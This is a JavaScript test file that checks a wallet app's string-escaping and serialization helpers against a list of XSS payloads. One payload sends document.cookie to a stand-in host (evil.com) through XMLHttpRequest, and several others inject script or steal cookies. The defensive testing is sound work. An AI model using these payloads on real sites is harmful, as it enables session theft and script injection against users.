/**
 * Integration test: Security - XSS Prevention
 * Tests that all known XSS vectors are properly sanitized
 */
import { escapeJsString, safeJsValue } from '../../utils/sanitize';

describe('Security: XSS Prevention Integration', () => {
  // Real-world XSS payloads that have been used in wallet attacks
  const XSS_PAYLOADS = [
    "'; alert('xss'); //",
    '"; alert("xss"); //',
    '`; alert(`xss`); //',
    '</script><script>alert(1)</script>',
    "javascript:alert(1)",
    "' onmouseover='alert(1)",
    '\'; var x = new XMLHttpRequest(); x.open("GET","https://evil.com?c="+document.cookie); x.send(); //',
    "${alert(document.cookie)}",
    "\\'; alert(1); //",
    "\n'; alert(1); //",
    "\0'; alert(1); //",
  ];

  describe('escapeJsString blocks all payloads', () => {
    XSS_PAYLOADS.forEach((payload, i) => {
      it(`blocks payload #${i + 1}: ${payload.slice(0, 40)}...`, () => {
        const escaped = escapeJsString(payload);

        // The escaped string, when placed inside single quotes in JS,
        // should never break out of the string context
        // We verify by checking that unescaped quotes don't appear at string boundaries
        const testJs = `var x = '${escaped}';`;

        // Should not contain unescaped single quotes that could break out
        // (escaped quotes like \' are fine)
        const unescapedQuotePattern = /[^\\]'/g;
        const matches = testJs.match(unescapedQuotePattern) || [];
        // Should only have the opening and closing quotes of our var assignment
        expect(matches.length).toBeLessThanOrEqual(2);
      });
    });
  });

  describe('safeJsValue blocks all payloads', () => {
    XSS_PAYLOADS.forEach((payload, i) => {
      it(`safely serializes payload #${i + 1}`, () => {
        const safe = safeJsValue(payload);
        // JSON.stringify always produces valid JSON that can't break out of JS
        expect(() => JSON.parse(safe)).not.toThrow();
        expect(JSON.parse(safe)).toBe(payload);
      });
    });
  });

  describe('safeJsValue handles complex objects', () => {
    it('safely serializes account data with malicious name', () => {
      const account = {
        address: '5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY',
        name: "'; alert(document.cookie); //",
      };
      const safe = safeJsValue(account);
      const parsed = JSON.parse(safe);
      expect(parsed.name).toBe(account.name);
      expect(parsed.address).toBe(account.address);
    });
  });
});
